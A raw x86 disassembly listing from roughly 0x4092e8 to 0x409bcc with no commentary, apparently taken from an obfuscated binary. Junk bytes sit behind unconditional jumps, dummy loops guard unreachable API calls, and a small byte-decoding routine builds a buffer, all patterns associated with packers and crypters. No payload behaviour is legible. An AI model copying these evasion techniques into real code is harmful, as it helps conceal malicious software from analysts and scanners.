  4092e8:	push   0x55d9
  4092ed:	call   DWORD PTR ds:0x43c884
  4092f3:	cmp    DWORD PTR ds:0x43fbe8,0x8
  4092fa:	jne    0x40930d
  409300:	mov    ecx,DWORD PTR ds:0x43fbe8
  409306:	inc    ecx
  409307:	mov    DWORD PTR ds:0x43fbe8,ecx
  40930d:	cmp    DWORD PTR ds:0x43fbe8,0x14
  409314:	jb     0x4092c6
  40931a:	mov    ecx,0x3b08
  40931f:	add    ax,cx
  409322:	movzx  eax,ax
  409325:	sub    ecx,0x7afe
  40932b:	mov    DWORD PTR [ebp-0xc],eax
  40932e:	mov    BYTE PTR [ebp-0x1],0x7f
  409332:	lea    eax,[ebp-0x1]
  409335:	mov    DWORD PTR [ebp-0x10],eax
  409338:	and    ecx,0x503
  40933e:	jmp    0x409494
  409343:	mov    ?,ebx
  409345:	icebp  
  409346:	test   al,0x85
  409348:	stos   BYTE PTR es:[edi],al
  409349:	mov    ebp,0xef32abd
  40934e:	cmp    eax,0xc8df1853
  409353:	(bad)  
  409357:	daa    
  409358:	jg     0x4093d6
  40935a:	jl     0x409392
  40935c:	cmp    edi,DWORD PTR [edx-0x25]
  40935f:	test   BYTE PTR [ebx-0x11],dh
  409362:	sbb    DWORD PTR [edi-0x3cad81d5],edi
  409368:	mov    eax,ds:0xe7196447
  40936d:	inc    ecx
  40936e:	aaa    
  40936f:	mov    edx,0x374e527d
  409374:	gs sbb eax,0x7688561d
  40937a:	scas   al,BYTE PTR es:[edi]
  40937b:	shr    eax,0xfb
  40937e:	mov    bh,0xdf
  409380:	cmp    DWORD PTR [ecx-0x4644c377],0xffffffb9
  409387:	jp     0x40931b
  409389:	xchg   edx,eax
  40938a:	adc    al,0x94
  40938c:	sub    eax,0x932c78aa
  409391:	in     al,0x81
  409393:	retf   
  409394:	sbb    bh,BYTE PTR [edx+ebp*8]
  409397:	push   edi
  409398:	jae    0x4093db
  40939a:	inc    ecx
  40939b:	mov    ds:0x9d7d4c63,eax
  4093a0:	sub    bh,BYTE PTR [edi-0x1]
  4093a3:	ror    BYTE PTR [edx-0x41],1
  4093a6:	inc    ecx
  4093a7:	inc    ebx
  4093a8:	hlt    
  4093a9:	mov    edi,0x8740f08d
  4093ae:	add    ah,ah
  4093b0:	pusha  
  4093b1:	mov    ebp,0x3c2f1ba2
  4093b6:	adc    eax,0xccb18309
  4093bb:	retf   
  4093bc:	sahf   
  4093bd:	jg     0x4093bd
  4093bf:	push   0xffffffba
  4093c1:	xchg   esp,eax
  4093c2:	adc    esp,eax
  4093c4:	jle    0x40934e
  4093c6:	mov    WORD PTR [ecx+0x737ee3a6],es
  4093cc:	sahf   
  4093cd:	push   0xfffffff8
  4093cf:	sahf   
  4093d0:	push   esi
  4093d1:	cwde   
  4093d2:	or     DWORD PTR [esi+0x6c880fa6],eax
  4093d8:	fsub   DWORD PTR [ecx-0x13099d3b]
  4093de:	(bad)  
  4093df:	scas   al,BYTE PTR es:[edi]
  4093e0:	repnz ins BYTE PTR es:[edi],dx
  4093e2:	inc    eax
  4093e3:	push   esi
  4093e4:	imul   ebx,DWORD PTR [edx+ecx*1+0x42],0x3c
  4093e9:	pop    edi
  4093ea:	leave  
  4093eb:	(bad)  
  4093ec:	jbe    0x40940d
  4093ee:	jmp    0xbf06:0x77e55549
  4093f5:	jno    0x409389
  4093f7:	pop    edx
  4093f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f9:	into   
  4093fa:	fcom   DWORD PTR [edi+eax*2-0x5db65f2e]
  409401:	mov    BYTE PTR ds:0xa680e6e6,ch
  409407:	sub    eax,0x33e5bb6
  40940c:	sbb    eax,0x10df51ad
  409411:	lahf   
  409412:	adc    al,0xdf
  409414:	xor    DWORD PTR [ecx+0x5348dae7],edi
  40941a:	cmc    
  40941b:	adc    eax,0x9f9b7954
  409420:	adc    DWORD PTR [ebp+0x6e],edi
  409423:	fimul  WORD PTR [ebx+0x69]
  409426:	mov    ebp,0x9640ec8a
  40942b:	sbb    bl,BYTE PTR [esi+0x68d3f168]
  409431:	in     al,dx
  409432:	daa    
  409433:	inc    ecx
  409434:	xchg   ebp,eax
  409435:	fucom  st(6)
  409437:	cmc    
  409438:	jecxz  0x4093c7
  40943a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40943b:	sbb    eax,0x3f5a7dd1
  409440:	cmp    DWORD PTR [ecx+0x29b277ee],ebx
  409446:	sub    DWORD PTR [ecx],esp
  409448:	cmp    bl,ah
  40944a:	iret   
  40944b:	mov    es,WORD PTR [esi+ecx*4-0x3d1fce4]
  409452:	lahf   
  409453:	jp     0x409464
  409455:	aad    0xed
  409457:	je     0x409481
  409459:	pushf  
  40945a:	fwait
  40945b:	or     ecx,DWORD PTR [esi+0x43]
  40945e:	cmp    esi,0xffffff88
  409461:	dec    ebx
  409462:	mov    BYTE PTR [esi+eiz*8+0x3f8b531c],bh
  409469:	and    DWORD PTR [edx+0xc1d8683],esp
  40946f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409470:	mov    fs,ebp
  409472:	popa   
  409473:	xchg   esp,eax
  409474:	fadd   DWORD PTR [eax-0x48950abb]
  40947a:	sbb    eax,0x5638e1dd
  40947f:	pop    esp
  409480:	pop    edi
  409481:	adc    al,0xa7
  409483:	xchg   esi,eax
  409484:	test   BYTE PTR [ecx-0x246eb5a7],cl
  40948a:	mov    ds:0x4b4cad81,al
  40948f:	pushw  cs
  409491:	cmp    ebp,0xffffffc9
  409494:	mov    al,BYTE PTR [ebp-0x1]
  409497:	xor    DWORD PTR ds:0x41341a,0x9c1
  4094a1:	mov    ecx,DWORD PTR [ebp-0x10]
  4094a4:	and    DWORD PTR ds:0x4427bc,0x7bc2
  4094ae:	xor    al,0x49
  4094b0:	sub    al,0x35
  4094b2:	mov    DWORD PTR ds:0x4105cf,0x4e04
  4094bc:	mov    BYTE PTR [ecx],al
  4094be:	sbb    DWORD PTR ds:0x43fbe8,0x3d76
  4094c8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4094cf:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  4094d6:	or     ecx,0x8aa
  4094dc:	mov    eax,DWORD PTR [ebp-0x8]
  4094df:	and    DWORD PTR ds:0x445368,0x0
  4094e9:	mov    ecx,DWORD PTR ds:0x445368
  4094ef:	inc    ecx
  4094f0:	mov    DWORD PTR ds:0x445368,ecx
  4094f6:	cmp    DWORD PTR ds:0x445368,0x1e
  4094fd:	jne    0x40951b
  409503:	push   DWORD PTR [ebp-0x10]
  409506:	push   0x4107b9
  40950b:	push   0x41080d
  409510:	push   0x4107b9
  409515:	call   DWORD PTR ds:0x43c520
  40951b:	cmp    DWORD PTR ds:0x445368,0x11
  409522:	jb     0x4094e9
  409528:	xor    DWORD PTR ds:0x413406,ebx
  40952e:	mov    ecx,0x7510857
  409533:	push   esi
  409534:	and    DWORD PTR ds:0x4427ac,0x0
  40953e:	jmp    0x409550
  409543:	mov    esi,DWORD PTR ds:0x4427ac
  409549:	inc    esi
  40954a:	mov    DWORD PTR ds:0x4427ac,esi
  409550:	cmp    DWORD PTR ds:0x4427ac,0x17
  409557:	jae    0x409585
  40955d:	cmp    DWORD PTR ds:0x4427ac,0x1e
  409564:	jne    0x409580
  40956a:	push   0x410629
  40956f:	push   DWORD PTR [ebp-0x20]
  409572:	push   DWORD PTR [ebp-0x20]
  409575:	push   0x7787
  40957a:	call   DWORD PTR ds:0x43c888
  409580:	jmp    0x409543
  409585:	xor    eax,ecx
  409587:	mov    esi,0x32729e
  40958c:	add    eax,esi
  40958e:	jmp    0x4095af
  409593:	mov    DWORD PTR ds:0x4427b8,0x1147
  40959d:	mov    dl,BYTE PTR [ebp-0x1]
  4095a0:	mov    DWORD PTR ds:0x43fbfc,0x2700
  4095aa:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  4095ae:	inc    eax
  4095af:	mov    DWORD PTR ds:0x4427b4,0x2e0e
  4095b9:	cmp    eax,0x40
  4095bc:	jb     0x409593
  4095c2:	mov    edx,DWORD PTR [ebp-0x8]
  4095c5:	xor    DWORD PTR ds:0x4105bf,0x7536
  4095cf:	mov    eax,DWORD PTR [ebp-0xc]
  4095d2:	add    DWORD PTR ds:0x43fbf8,0x445374
  4095dc:	jmp    0x409732
  4095e1:	cmp    eax,ebx
  4095e3:	bound  edx,QWORD PTR [edx+0x65]
  4095e6:	push   0x39
  4095e8:	pop    ebx
  4095e9:	jmp    0x4095e6
  4095eb:	adc    al,0xc5
  4095ed:	push   esi
  4095ee:	test   eax,0xcdb6c53e
  4095f3:	jl     0x409671
  4095f5:	daa    
  4095f6:	jg     0x409674
  4095f8:	jl     0x4095b5
  4095fa:	fnstenv [edx]
  4095fc:	retf   0xb030
  4095ff:	fistp  DWORD PTR [edi-0x5c]
  409602:	pop    ss
  409603:	mov    edi,0xcc9300dc
  409608:	mov    ah,0xb0
  40960a:	sub    dl,bl
  40960c:	push   esi
  40960d:	cmp    eax,0x3657a56c
  409612:	mov    ch,0x7a
  409614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409615:	push   edi
  409616:	mov    bl,0x33
  409618:	inc    edi
  409619:	push   esp
  40961a:	jne    0x4095a1
  40961c:	stc    
  40961d:	add    DWORD PTR [edi+edi*8+0x35],edi
  409621:	clc    
  409622:	mov    ds:0x863700cf,al
  409627:	ficomp DWORD PTR [ebp-0x2e]
  40962a:	jmp    0x88f551
  40962f:	ret    0xf47d
  409632:	jmp    0x30c2468f
  409637:	fs cdq 
  409639:	adc    al,0x79
  40963b:	bound  ebp,QWORD PTR ds:0x7001a9e8
  409641:	popf   
  409642:	cmp    edi,edi
  409644:	fisttp WORD PTR [edi-0x7a]
  409647:	aam    0x24
  409649:	cmp    esp,edi
  40964b:	xchg   esi,eax
  40964c:	jl     0x4096ac
  40964e:	lahf   
  40964f:	cld    
  409650:	mov    al,ds:0x38ae83a
  409655:	pop    edx
  409656:	push   ss
  409657:	jnp    0x4096cb
  409659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40965a:	outs   dx,DWORD PTR ds:[esi]
  40965b:	adc    BYTE PTR ds:0x6b941397,bh
  409661:	(bad)  
  409662:	lds    ecx,FWORD PTR [ebp+0x6efb3fb]
  409668:	fmul   DWORD PTR [ecx]
  40966a:	shl    BYTE PTR [edx+edx*2+0x74],cl
  40966e:	sbb    ebp,edi
  409670:	inc    edi
  409671:	jbe    0x4096a5
  409673:	in     eax,0x9e
  409675:	cs in  eax,dx
  409677:	dec    eax
  409678:	popf   
  409679:	dec    ebp
  40967a:	cwde   
  40967b:	jl     0x409613
  40967d:	or     eax,0x2531fd39
  409682:	call   0x5ddef53e
  409687:	retf   0xdd92
  40968a:	jmp    0x6f9d:0x14190ca8
  409691:	mov    ecx,DWORD PTR [ecx-0x6105f73d]
  409697:	push   eax
  409698:	int    0x1d
  40969a:	mov    ebx,0xbe518245
  40969f:	pop    edx
  4096a0:	sub    DWORD PTR [edx-0x5fefc9c3],eax
  4096a6:	sbb    al,BYTE PTR [esi]
  4096a8:	push   es
  4096a9:	push   edi
  4096aa:	sub    al,0xfc
  4096ac:	pop    edx
  4096ad:	mov    WORD PTR [ebp-0x5c265610],gs
  4096b3:	mov    dh,0x89
  4096b5:	into   
  4096b6:	mov    edx,cr2
  4096b9:	mov    DWORD PTR [ecx+0x3ad65ef3],esi
  4096bf:	aas    
  4096c0:	or     al,0xa5
  4096c2:	cwde   
  4096c3:	mov    ebp,0x98938cd7
  4096c8:	inc    ebx
  4096c9:	bound  ebp,QWORD PTR [eax+0x4c]
  4096cc:	bound  esi,QWORD PTR [esi+0x11]
  4096cf:	xchg   ebx,eax
  4096d0:	mov    ebx,0xb5c31d60
  4096d5:	test   ah,cl
  4096d7:	sahf   
  4096d8:	shl    bh,0xb0
  4096db:	scas   eax,DWORD PTR es:[edi]
  4096dc:	jno    0x4096ce
  4096de:	add    esp,ebx
  4096e0:	xchg   edi,eax
  4096e1:	cmp    edx,DWORD PTR [edx-0x23]
  4096e4:	arpl   WORD PTR [esi-0x1f],cx
  4096e7:	add    eax,0x41efe68f
  4096ec:	cli    
  4096ed:	mov    ch,bh
  4096ef:	jmp    0x409765
  4096f1:	shr    edx,cl
  4096f3:	push   es
  4096f4:	int3   
  4096f5:	jns    0x409771
  4096f7:	jnp    0x4096e1
  4096f9:	cs popf 
  4096fb:	jp     0x40974d
  4096fd:	jb     0x40976f
  4096ff:	inc    ebp
  409700:	aas    
  409701:	shr    BYTE PTR [edi+0x3cfb0188],1
  409707:	mov    edx,0xd8c76efe
  40970c:	jge    0x40975f
  40970e:	mov    eax,0x8e56e0d3
  409713:	mov    ah,0x9e
  409715:	add    al,0xa9
  409717:	rol    ebp,cl
  409719:	xchg   edi,eax
  40971a:	jno    0x4096ec
  40971c:	lods   eax,DWORD PTR ds:[esi]
  40971d:	shl    ebx,cl
  40971f:	into   
  409720:	mov    dl,0x2d
  409722:	mov    esp,0xcd7296a9
  409727:	xchg   edx,eax
  409728:	mov    ah,0x76
  40972a:	mov    bh,0x64
  40972c:	loopne 0x409772
  40972e:	pop    edx
  40972f:	or     eax,DWORD PTR [edi+0x7b]
  409732:	xor    edx,ecx
  409734:	add    edx,esi
  409736:	mov    DWORD PTR ds:0x43fbf4,0x4464
  409740:	cmp    edx,eax
  409742:	mov    DWORD PTR ds:0x413416,0xc14
  40974c:	je     0x40993f
  409752:	add    DWORD PTR ds:0x43fbf0,0x1465
  40975c:	push   ebx
  40975d:	and    DWORD PTR ds:0x4427b0,0x0
  409767:	mov    eax,ds:0x4427b0
  40976c:	inc    eax
  40976d:	mov    ds:0x4427b0,eax
  409772:	cmp    DWORD PTR ds:0x4427b0,0x10
  409779:	jne    0x409785
  40977f:	call   DWORD PTR ds:0x43c88c
  409785:	cmp    DWORD PTR ds:0x4427b0,0xf
  40978c:	jne    0x40979d
  409792:	mov    eax,ds:0x4427b0
  409797:	inc    eax
  409798:	mov    ds:0x4427b0,eax
  40979d:	cmp    DWORD PTR ds:0x4427b0,0x1d
  4097a4:	jb     0x409767
  4097aa:	push   edi
  4097ab:	jmp    0x409901
  4097b0:	push   esp
  4097b1:	ss push edx
  4097b3:	std    
  4097b4:	push   edx
  4097b5:	jge    0x40981e
  4097b7:	pop    ebp
  4097b8:	add    al,0xa1
  4097ba:	or     eax,0x8892160d
  4097bf:	push   ds
  4097c0:	jno    0x409791
  4097c2:	jl     0x409840
  4097c4:	daa    
  4097c5:	jg     0x409843
  4097c7:	jl     0x409840
  4097c9:	adc    eax,0x7fc94bb7
  4097ce:	cli    
  4097cf:	sbb    BYTE PTR [esi+0xfa7ca58],dh
  4097d5:	pop    ebx
  4097d6:	or     al,0x59
  4097d8:	push   esp
  4097d9:	mov    eax,ds:0x3b81314c
  4097de:	or     DWORD PTR [edx+0xf3a36a7],edx
  4097e4:	jnp    0x409828
  4097e6:	leave  
  4097e7:	xor    al,0x30
  4097e9:	mov    dl,0xe8
  4097eb:	jecxz  0x409869
  4097ed:	xor    BYTE PTR [eax+0x2c16a0a1],al
  4097f3:	inc    ebx
  4097f4:	loopne 0x409830
  4097f6:	dec    esp
  4097f7:	fistp  WORD PTR [esi]
  4097f9:	dec    esp
  4097fa:	cmp    DWORD PTR [ecx*8-0x50febb9e],eax
  409801:	push   es
  409802:	jb     0x40981b
  409804:	cmp    BYTE PTR [ecx],al
  409806:	fwait
  409807:	sbb    al,0xc7
  409809:	jmp    0x7e68019a
  40980e:	inc    esi
  40980f:	xchg   cl,dl
  409811:	(bad)  
  409812:	hlt    
  409813:	xchg   ebp,eax
  409814:	add    al,0xec
  409816:	push   es
  409817:	xchg   edx,eax
  409818:	or     ecx,DWORD PTR [eax]
  40981a:	add    eax,0xe109a911
  40981f:	fst    DWORD PTR [eax+0x559dcf17]
  409825:	dec    eax
  409826:	pop    ebp
  409827:	pusha  
  409828:	in     eax,dx
  409829:	adc    BYTE PTR [ecx+0x6af089f9],ch
  40982f:	int    0x1d
  409831:	or     al,0xd7
  409833:	(bad)  
  409835:	pop    ss
  409836:	mov    BYTE PTR [ebx-0x30],cl
  409839:	pop    ds
  40983a:	jae    0x4097cc
  40983c:	sbb    ebx,DWORD PTR [edi+0x1f8d3aa4]
  409842:	(bad)  [esi+ecx*1]
  409845:	mov    esp,0x87e89596
  40984a:	mov    ah,0xe1
  40984c:	add    DWORD PTR gs:[edi-0x65],ecx
  409850:	push   ds
  409851:	fld    TBYTE PTR ss:[ecx]
  409854:	in     eax,0xf0
  409856:	dec    ebx
  409857:	stos   DWORD PTR es:[edi],eax
  409858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409859:	push   es
  40985a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40985b:	fadd   QWORD PTR ds:0x4a58ec68
  409861:	mov    ah,0x87
  409863:	push   esp
  409864:	retf   0x9c96
  409867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409868:	jbe    0x4097ff
  40986a:	shl    DWORD PTR [ecx+0x666859d5],0x48
  409871:	popf   
  409872:	adc    DWORD PTR [ecx+0x56615d83],edi
  409878:	ins    BYTE PTR es:[edi],dx
  409879:	loopne 0x409806
  40987b:	js     0x409838
  40987d:	ds adc eax,0x2ce53760
  409883:	dec    esi
  409884:	loope  0x4098da
  409886:	sub    eax,0xf7c1b90d
  40988b:	inc    eax
  40988c:	xchg   esi,eax
  40988d:	mov    esi,0x3f3fb6d3
  409892:	xchg   DWORD PTR [eax+0x7e],eax
  409895:	dec    edx
  409896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409897:	stc    
  409898:	call   0xbd44:0xfefa4782
  40989f:	mov    ds:0xe76d66ec,al
  4098a4:	adc    ecx,DWORD PTR [ebx]
  4098a6:	test   edx,ebx
  4098a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a9:	popa   
  4098aa:	push   ss
  4098ab:	and    DWORD PTR [ecx],esi
  4098ad:	mov    cl,0x95
  4098af:	add    BYTE PTR [eax-0x62],dl
  4098b2:	outs   dx,DWORD PTR ds:[esi]
  4098b3:	test   DWORD PTR [ebx+0x48],ebx
  4098b6:	jnp    0x409913
  4098b8:	ja     0x40988a
  4098ba:	sbb    esi,DWORD PTR [edx+0x3e]
  4098bd:	push   ss
  4098be:	push   ebp
  4098bf:	lea    edi,[edx-0x4d]
  4098c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098c3:	(bad)  
  4098c5:	inc    BYTE PTR [ebx]
  4098c7:	test   DWORD PTR [ecx-0x7ef2e68d],ebp
  4098cd:	inc    esi
  4098ce:	call   0x973f6a97
  4098d3:	jnp    0x4098b8
  4098d5:	cmc    
  4098d6:	imul   edx,DWORD PTR [eax],0x64
  4098d9:	push   esi
  4098da:	mov    ds:0x9f15a827,al
  4098df:	fdiv   QWORD PTR [ebp+eiz*2-0x18f86c27]
  4098e6:	outs   dx,DWORD PTR ds:[esi]
  4098e7:	in     al,0x49
  4098e9:	mov    ebx,0xda9ca029
  4098ee:	js     0x409905
  4098f0:	dec    edx
  4098f1:	xor    dl,ch
  4098f3:	or     eax,0x21d5573a
  4098f8:	popa   
  4098f9:	inc    edx
  4098fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098fb:	test   esp,ecx
  4098fd:	adc    ebx,0x7d8b9f09
  409903:	or     BYTE PTR [eax+0x8a42],bh
  409909:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40990e:	mov    edi,0x3b08
  409913:	add    ax,di
  409916:	movzx  eax,ax
  409919:	mov    DWORD PTR [ebp-0x14],eax
  40991c:	mov    eax,DWORD PTR [ebp+0x8]
  40991f:	movzx  eax,WORD PTR [eax+edx*4]
  409923:	xor    eax,0x8a42
  409928:	add    eax,edi
  40992a:	mov    edi,DWORD PTR [ebp-0x14]
  40992d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  409931:	mov    eax,DWORD PTR [ebp-0xc]
  409934:	inc    edx
  409935:	cmp    edx,eax
  409937:	jne    0x409901
  40993d:	pop    edi
  40993e:	pop    ebx
  40993f:	mov    eax,DWORD PTR [ebp-0x8]
  409942:	mov    edx,DWORD PTR [ebp+0x10]
  409945:	xor    eax,ecx
  409947:	add    eax,esi
  409949:	mov    DWORD PTR [edx],eax
  40994b:	mov    eax,DWORD PTR [ebp-0x8]
  40994e:	xor    eax,ecx
  409950:	add    eax,esi
  409952:	mov    DWORD PTR [ebp+0x8],eax
  409955:	mov    eax,DWORD PTR [ebp+0x8]
  409958:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40995c:	mov    dl,BYTE PTR [ebp-0x1]
  40995f:	cmp    al,dl
  409961:	je     0x409afa
  409967:	mov    eax,DWORD PTR [ebp+0x8]
  40996a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40996e:	mov    edx,DWORD PTR [ebp+0xc]
  409971:	cmp    al,BYTE PTR [edx]
  409973:	jne    0x409b20
  409979:	mov    eax,DWORD PTR [ebp-0x8]
  40997c:	mov    edx,DWORD PTR [ebp+0xc]
  40997f:	movsx  edx,BYTE PTR [edx]
  409982:	xor    eax,ecx
  409984:	add    eax,esi
  409986:	cmp    edx,eax
  409988:	je     0x409b14
  40998e:	jmp    0x409ae4
  409993:	add    ah,ah
  409995:	clc    
  409996:	pop    es
  409997:	clc    
  409998:	sbb    esp,ebx
  40999a:	sti    
  40999b:	ins    DWORD PTR es:[edi],dx
  40999c:	sbb    BYTE PTR [esp+ebp*8],ch
  40999f:	aas    
  4099a0:	mov    gs,WORD PTR [ecx+0x7cce388f]
  4099a6:	jl     0x4099cf
  4099a8:	jg     0x409a26
  4099aa:	jl     0x409979
  4099ac:	xchg   ebx,eax
  4099ad:	or     edi,ecx
  4099af:	aaa    
  4099b0:	retf   
  4099b1:	or     ah,BYTE PTR [edx+0x2f]
  4099b4:	add    al,BYTE PTR [ebx-0x1442f260]
  4099ba:	push   cs
  4099bb:	mov    dl,0xf6
  4099bd:	aam    0xb
  4099bf:	fwait
  4099c0:	shl    BYTE PTR [edx+0x56],cl
  4099c3:	push   ebp
  4099c4:	xchg   ecx,eax
  4099c5:	pop    es
  4099c6:	mov    WORD PTR [ebx],gs
  4099c8:	pop    ss
  4099c9:	jg     0x409a21
  4099cb:	adc    ah,al
  4099cd:	mov    esi,0xf5be6d72
  4099d2:	push   es
  4099d3:	popa   
  4099d4:	dec    edi
  4099d5:	jmp    0xf6583983
  4099da:	(bad)  
  4099db:	push   esi
  4099dc:	mov    eax,ebx
  4099de:	pop    ds
  4099df:	push   0x9
  4099e1:	test   eax,0x385be77d
  4099e6:	mov    eax,ds:0xd20a040a
  4099eb:	mov    bh,ch
  4099ed:	jnp    0x409a1d
  4099ef:	cmc    
  4099f0:	lock cdq 
  4099f2:	xchg   ebx,eax
  4099f3:	jno    0x409a27
  4099f5:	(bad)  
  4099f7:	jg     0x409a58
  4099f9:	mov    ds:0x6697dc9e,al
  4099fe:	test   DWORD PTR [edi],edi
  409a00:	push   ds
  409a01:	and    DWORD PTR [ecx],edx
  409a03:	or     eax,0xc2c4c67f
  409a08:	aad    0xeb
  409a0a:	scas   eax,DWORD PTR es:[edi]
  409a0b:	dec    eax
  409a0c:	ss ror cl,1
  409a0f:	ror    BYTE PTR ds:0x8bae93e1,0xa0
  409a16:	pop    edi
  409a17:	fwait
  409a18:	or     eax,ebp
  409a1a:	int    0x85
  409a1c:	pop    esi
  409a1d:	jmp    0x4099c6
  409a1f:	rcl    DWORD PTR [esi+0x3b],1
  409a22:	pop    ss
  409a23:	xlat   BYTE PTR ds:[ebx]
  409a24:	mov    ds:0xf5241d05,al
  409a29:	sti    
  409a2a:	lock mov edi,0x10d9eae7
  409a30:	xchg   esp,eax
  409a31:	out    0x34,eax
  409a33:	test   DWORD PTR [edi-0x796c91ff],0x5bcba869
  409a3d:	jmp    0x409a78
  409a3f:	cdq    
  409a40:	stc    
  409a41:	fcomp  QWORD PTR [eax+0x6d]
  409a44:	lods   al,BYTE PTR ds:[esi]
  409a45:	repz retf 
  409a47:	imul   ebp,ecx,0xffffffd8
  409a4a:	jge    0x409aca
  409a4c:	loopne 0x409a4d
  409a4e:	rcr    BYTE PTR [ebp-0x68],1
  409a51:	add    DWORD PTR [ecx-0x3a04fd53],esp
  409a57:	daa    
  409a58:	lods   al,BYTE PTR ds:[esi]
  409a59:	out    0xb0,al
  409a5b:	push   ss
  409a5c:	mov    ah,BYTE PTR [edi]
  409a5e:	and    DWORD PTR [edi-0x6b],esi
  409a61:	mov    ds:0x4664606f,al
  409a66:	hlt    
  409a67:	out    0xcf,eax
  409a69:	fwait
  409a6a:	add    eax,0xca37fd34
  409a6f:	stos   BYTE PTR es:[edi],al
  409a70:	xchg   ecx,eax
  409a71:	mov    BYTE PTR [ebp+0x13],ch
  409a74:	test   eax,0x8044fe62
  409a79:	call   0xd3f1:0x2f8e092
  409a80:	push   edi
  409a81:	inc    ebx
  409a82:	std    
  409a83:	dec    edi
  409a84:	rcl    BYTE PTR [edx],0x1b
  409a87:	mov    ah,0x22
  409a89:	jbe    0x409a46
  409a8b:	data16 (bad) 
  409a8d:	jo     0x409adb
  409a8f:	mov    cl,0xa4
  409a91:	mov    DWORD PTR [esi+0x6e9b924d],eax
  409a97:	add    eax,0x141fa934
  409a9c:	shr    cl,cl
  409a9e:	mov    ah,dh
  409aa0:	shl    BYTE PTR [eax-0x13d74720],0xfd
  409aa7:	push   eax
  409aa8:	jge    0x409a82
  409aaa:	leave  
  409aab:	xchg   DWORD PTR [edx+0x61],esi
  409aae:	mov    ds:0x2088a431,eax
  409ab3:	mov    eax,0x7073378e
  409ab8:	xchg   edi,eax
  409ab9:	loope  0x409b00
  409abb:	stc    
  409abc:	arpl   WORD PTR [ebp-0x7],si
  409abf:	or     eax,DWORD PTR [edx+0x121ee455]
  409ac5:	dec    esp
  409ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac7:	push   ebx
  409ac8:	xchg   esi,eax
  409ac9:	xlat   BYTE PTR ds:[ebx]
  409aca:	fisub  WORD PTR [edi+esi*8]
  409acd:	scas   al,BYTE PTR es:[edi]
  409ace:	xor    eax,0x8a46579c
  409ad3:	fbld   TBYTE PTR [ecx+0x6c0f1c42]
  409ad9:	sub    BYTE PTR [ebp+0x56],bh
  409adc:	sbb    bl,BYTE PTR ds:0xc3dcdf71
  409ae2:	sub    ecx,eax
  409ae4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  409aeb:	lea    eax,[ebp-0x18]
  409aee:	mov    DWORD PTR [ebp-0x14],eax
  409af1:	mov    eax,DWORD PTR [ebp-0x14]
  409af4:	add    DWORD PTR [eax],0x705fa8f
  409afa:	mov    eax,DWORD PTR [ebp-0x10]
  409afd:	mov    edx,DWORD PTR [ebp+0x8]
  409b00:	xor    eax,ecx
  409b02:	lea    eax,[eax+edx*1+0x32729e]
  409b09:	mov    DWORD PTR [ebp+0x8],eax
  409b0c:	inc    DWORD PTR [ebp+0xc]
  409b0f:	jmp    0x409955
  409b14:	mov    eax,DWORD PTR [ebp-0x10]
  409b17:	xor    eax,ecx
  409b19:	mov    ecx,DWORD PTR [ebp+0x10]
  409b1c:	add    eax,esi
  409b1e:	mov    DWORD PTR [ecx],eax
  409b20:	pop    esi
  409b21:	leave  
  409b22:	ret    0xc
  409b25:	push   ebp
  409b26:	mov    ebp,esp
  409b28:	push   ecx
  409b29:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  409b30:	sub    DWORD PTR ds:0x4105cb,edx
  409b36:	mov    eax,DWORD PTR [ebp+0x8]
  409b39:	jmp    0x409ca4
  409b3e:	push   cs
  409b3f:	xchg   BYTE PTR [esi],dl
  409b41:	fs xchg esi,eax
  409b43:	fs dec esi
  409b45:	data16 jg 0x409bb3
  409b48:	pop    esp
  409b49:	lds    eax,FWORD PTR [esi]
  409b4b:	and    DWORD PTR [edx-0x1b],ecx
  409b4e:	jecxz  0x409b11
  409b50:	jl     0x409bce
  409b52:	retf   0x7c7f
  409b55:	jl     0x409bc0
  409b57:	fistp  WORD PTR [bp+0x3ab5]
  409b5c:	ret    0x4082
  409b5f:	in     eax,0xaa
  409b61:	push   esp
  409b62:	inc    ebx
  409b63:	push   es
  409b64:	cdq    
  409b65:	push   0x47
  409b67:	add    esp,DWORD PTR [eax]
  409b69:	ror    edi,0x99
  409b6c:	paddusw mm0,QWORD PTR [ebx+0x1dde222b]
  409b73:	mov    ebp,DWORD PTR [edi-0x24ca82bb]
  409b79:	mov    BYTE PTR [edx-0x4ef640bc],al
  409b7f:	sbb    DWORD PTR [ecx+esi*2+0x5b],ecx
  409b83:	cmp    eax,0x1e08a7d5
  409b88:	fiadd  DWORD PTR [edi]
  409b8a:	adc    DWORD PTR [ebx+ebp*1+0x76f6fb92],ecx
  409b91:	out    dx,eax
  409b92:	data16 mov al,0x5c
  409b95:	adc    al,ch
  409b97:	push   ebp
  409b98:	arpl   WORD PTR [edx+0x48],bp
  409b9b:	inc    esi
  409b9c:	jmp    0x1a7b:0xa7ebc2c6
  409ba3:	jno    0x409ba2
  409ba5:	fdivr  DWORD PTR [ebx-0x46698c48]
  409bab:	fidiv  WORD PTR [edx+0x7518d465]
  409bb1:	or     eax,eax
  409bb3:	test   eax,0x2d46e3c1
  409bb8:	dec    edi
  409bb9:	daa    
  409bba:	jmp    0x2bfa:0xeef00376
  409bc1:	js     0x409b85
  409bc3:	aad    0xa6
  409bc5:	push   ecx
  409bc6:	outs   dx,BYTE PTR ds:[esi]
  409bc7:	adc    DWORD PTR [esi-0x31],ecx
  409bca:	jnp    0x409b4f
  409bcc:	ja     0x409bd1
